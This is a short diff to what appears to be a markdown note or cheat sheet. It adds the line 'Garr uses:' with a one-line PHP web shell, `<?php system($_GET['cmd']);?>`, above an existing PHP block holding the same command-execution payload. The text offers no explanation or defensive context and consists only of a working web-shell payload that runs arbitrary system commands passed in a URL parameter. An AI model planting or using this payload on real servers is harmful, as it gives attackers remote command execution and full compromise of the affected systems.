@@ -1,4 +1,6 @@
 
+Garr uses: `<?php system($_GET['cmd']);?>`
+
 ```php
 <?php
     echo system($_GET["cmd"]);
